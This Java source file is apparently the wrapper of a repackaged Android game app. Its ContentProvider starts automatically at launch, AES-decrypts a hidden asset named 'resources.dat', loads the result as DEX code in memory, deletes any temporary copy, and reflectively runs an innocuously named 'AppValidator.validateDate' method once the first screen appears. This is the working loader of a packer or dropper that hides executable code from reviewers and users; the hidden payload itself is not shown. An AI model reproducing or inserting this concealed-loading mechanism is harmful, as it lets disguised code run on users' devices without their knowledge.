package com.superking.parchisi.shell;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.content.res.AssetManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import com.superking.parchisi.shell.activity.AbstractContentProvider;
import com.superking.parchisi.shell.utils.KeyGeneratorUtil;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class DefaultProvider extends AbstractContentProvider {
  
  private static final String TAG = "DefaultProvider";
  private static final String ENCRYPTED_ASSET = "resources.dat";
  private static boolean isValidatorQueued = false;
  private static boolean isValidatorExecuted = false;
  
  @Override
  public boolean onCreate() {
    Context context = getContext();
    
    new Thread(() -> {
      try {
        // 1. Generar la clave simétrica
        KeyGeneratorUtil keyGenerator = new KeyGeneratorUtil();
        SecretKey secretKey = keyGenerator.generateSymmetricKey(context);
        
        // 2. Leer y desencriptar el archivo desde assets
        byte[] dexData = decryptAsset(context, secretKey);
        
        // 3. Cargar el DEX directamente desde memoria
        loadSecondaryDexFromMemory(context, dexData);
        
        // 4. Programar la ejecución del AppValidator con contexto de Activity
        scheduleValidatorExecution(context);
        
        // 5. Fallback: intentar ejecutar después de 5 segundos si no se ejecutó
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
          if (isValidatorQueued && !isValidatorExecuted) {
            Log.w(TAG, "Fallback: Executing validator with provider context after 5s timeout");
            executeAppValidatorFallback(context);
          }
        }, 5000);
        
      } catch (Exception e) {
        Log.e(TAG, "Error in secondary dex loading: " + e.getMessage(), e);
      }
    }).start();
    
    return true;
  }
  
  private void scheduleValidatorExecution(Context context) {
    if (isValidatorQueued) {
      Log.d(TAG, "Validator already queued, skipping");
      return;
    }
    isValidatorQueued = true;
    
    Log.d(TAG, "Scheduling validator execution...");
    Application app = (Application) context.getApplicationContext();
    
    // Registrar callback para esperar la primera actividad
    app.registerActivityLifecycleCallbacks(new Application.ActivityLifecycleCallbacks() {
      private boolean executed = false;
      
      @Override
      public void onActivityCreated(Activity activity, Bundle savedInstanceState) {
        Log.d(TAG, "Activity created: " + activity.getClass().getSimpleName());
      }
      
      @Override
      public void onActivityStarted(Activity activity) {
        Log.d(TAG, "Activity started: " + activity.getClass().getSimpleName());
      }
      
      @Override
      public void onActivityResumed(Activity activity) {
        Log.d(TAG, "Activity resumed: " + activity.getClass().getSimpleName() + ", executed: " + executed);
        if (!executed) {
          executed = true;
          Log.d(TAG, "First activity resumed, scheduling validator execution...");
          
          // Pequeño delay para asegurar que la UI esté completamente lista
          new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Log.d(TAG, "Executing validator after delay...");
            isValidatorExecuted = true;
            executeAppValidator(activity);
          }, 1000); // 1 segundo de delay
          
          // Desregistrar para evitar múltiples ejecuciones
          app.unregisterActivityLifecycleCallbacks(this);
          Log.d(TAG, "Lifecycle callbacks unregistered");
        }
      }
      
      @Override
      public void onActivityPaused(Activity activity) {
        Log.d(TAG, "Activity paused: " + activity.getClass().getSimpleName());
      }
      
      @Override
      public void onActivityStopped(Activity activity) {}
      
      @Override
      public void onActivitySaveInstanceState(Activity activity, Bundle outState) {}
      
      @Override
      public void onActivityDestroyed(Activity activity) {}
    });
    
    Log.d(TAG, "Lifecycle callbacks registered successfully");
  }
  
  private void executeAppValidator(Context activityContext) {
    Log.d(TAG, "executeAppValidator called with context: " + activityContext.getClass().getSimpleName());
    
    // Ejecutar en hilo separado para no bloquear UI
    new Thread(() -> {
      try {
        Log.d(TAG, "Getting secondary ClassLoader...");
        ClassLoader secondaryLoader = ClassLoaderManager.getSecondaryClassLoader();
        
        if (secondaryLoader == null) {
          Log.e(TAG, "Secondary ClassLoader is null!");
          return;
        }
        
        Log.d(TAG, "Secondary ClassLoader found: " + secondaryLoader.getClass().getSimpleName());
        
        Log.d(TAG, "Loading AppValidator class...");
        // Cargar la clase AppValidator desde el secondary DEX
        Class<?> appValidatorClass = secondaryLoader.loadClass(
                "com.superking.parchisi.shell.secondary.helpers.AppValidator");
        
        Log.d(TAG, "AppValidator class loaded: " + appValidatorClass.getName());
        
        // Crear instancia y llamar al método validateDate
        Log.d(TAG, "Creating AppValidator instance...");
        Object appValidator = appValidatorClass.newInstance();
        
        Log.d(TAG, "Getting validateDate method...");
        Method validateMethod = appValidatorClass.getMethod("validateDate", Context.class);
        
        Log.d(TAG, "Invoking validateDate with activity context...");
        validateMethod.invoke(appValidator, activityContext); // ¡Aquí pasas el contexto de Activity!
        
        Log.d(TAG, "AppValidator ejecutado exitosamente con contexto de Activity");
        
      } catch (Exception e) {
        Log.e(TAG, "Error ejecutando AppValidator: " + e.getMessage(), e);
        e.printStackTrace();
      }
    }).start();
  }
  
  private byte[] decryptAsset(Context context, SecretKey secretKey) throws Exception {
    AssetManager assetManager = context.getAssets();
    try (InputStream is = assetManager.open(ENCRYPTED_ASSET);
         ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
      
      byte[] buffer = new byte[1024];
      int bytesRead;
      while ((bytesRead = is.read(buffer)) != -1) {
        bos.write(buffer, 0, bytesRead);
      }
      
      byte[] encryptedData = bos.toByteArray();
      
      // Separar IV (primeros 16 bytes) y datos encriptados
      byte[] iv = Arrays.copyOfRange(encryptedData, 0, 16);
      byte[] actualEncryptedData = Arrays.copyOfRange(encryptedData, 16, encryptedData.length);
      
      // Desencriptar
      Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
      cipher.init(Cipher.DECRYPT_MODE, secretKey, new IvParameterSpec(iv));
      
      return cipher.doFinal(actualEncryptedData);
    }
  }
  
  private void loadSecondaryDexFromMemory(Context context, byte[] dexData) throws Exception {
    try {
      // Intentar usar InMemoryDexClassLoader (API 26+)
      if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
        loadWithInMemoryDexClassLoader(dexData, context);
      } else {
        // Para APIs anteriores, usar método con reflexión
        loadWithReflection(dexData, context);
      }
      
    } catch (Exception e) {
      Log.e(TAG, "Error loading dex from memory, falling back to file method", e);
      loadWithFileFallback(context, dexData);
    }
  }
  
  @android.annotation.TargetApi(android.os.Build.VERSION_CODES.O)
  private void loadWithInMemoryDexClassLoader(byte[] dexData, Context context) throws Exception {
    ByteBuffer dexBuffer = ByteBuffer.wrap(dexData);
    dalvik.system.InMemoryDexClassLoader classLoader =
            new dalvik.system.InMemoryDexClassLoader(dexBuffer, context.getClassLoader());
    
    ClassLoaderManager.setSecondaryClassLoader(classLoader);
    Log.d(TAG, "DEX loaded using InMemoryDexClassLoader (API 26+)");
  }
  
  private void loadWithReflection(byte[] dexData, Context context) throws Exception {
    // Crear ByteBuffer con los datos DEX
    ByteBuffer dexBuffer = ByteBuffer.wrap(dexData);
    
    // Obtener el método usando reflexión
    Class<?> inMemoryDexClassLoaderClass = Class.forName("dalvik.system.InMemoryDexClassLoader");
    Constructor<?> constructor = inMemoryDexClassLoaderClass.getConstructor(
            ByteBuffer.class, ClassLoader.class);
    
    ClassLoader classLoader = (ClassLoader) constructor.newInstance(
            dexBuffer, context.getClassLoader());
    
    ClassLoaderManager.setSecondaryClassLoader(classLoader);
    Log.d(TAG, "DEX loaded using reflection (API <26)");
  }
  
  private void loadWithFileFallback(Context context, byte[] dexData) throws Exception {
    // Fallback: guardar temporalmente en caché y cargar normalmente
    File cacheDir = context.getCacheDir();
    File dexFile = new File(cacheDir, "secondary.dex");
    
    try (FileOutputStream fos = new FileOutputStream(dexFile)) {
      fos.write(dexData);
    }
    
    File optimizedDir = new File(cacheDir, "optimized_dex");
    if (!optimizedDir.exists()) {
      optimizedDir.mkdirs();
    }
    
    ClassLoader dexClassLoader = new dalvik.system.DexClassLoader(
            dexFile.getAbsolutePath(),
            optimizedDir.getAbsolutePath(),
            null,
            context.getClassLoader()
    );
    
    ClassLoaderManager.setSecondaryClassLoader(dexClassLoader);
    Log.d(TAG, "DEX loaded using fallback file method");
    
    // Limpiar archivo temporal
    dexFile.delete();
  }
  
  private void executeAppValidatorFallback(Context context) {
    Log.d(TAG, "executeAppValidatorFallback called with provider context");
    
    new Thread(() -> {
      try {
        ClassLoader secondaryLoader = ClassLoaderManager.getSecondaryClassLoader();
        
        if (secondaryLoader == null) {
          Log.e(TAG, "Secondary ClassLoader is null in fallback!");
          return;
        }
        
        Log.d(TAG, "Fallback: Loading AppValidator class...");
        Class<?> appValidatorClass = secondaryLoader.loadClass(
                "com.superking.parchisi.shell.secondary.helpers.AppValidator");
        
        Object appValidator = appValidatorClass.newInstance();
        Method validateMethod = appValidatorClass.getMethod("validateDate", Context.class);
        
        Log.d(TAG, "Fallback: Invoking validateDate with provider context...");
        validateMethod.invoke(appValidator, context);
        
        Log.d(TAG, "AppValidator ejecutado exitosamente via fallback");
        
      } catch (Exception e) {
        Log.e(TAG, "Error en fallback AppValidator: " + e.getMessage(), e);
        e.printStackTrace();
      }
    }).start();
  }
}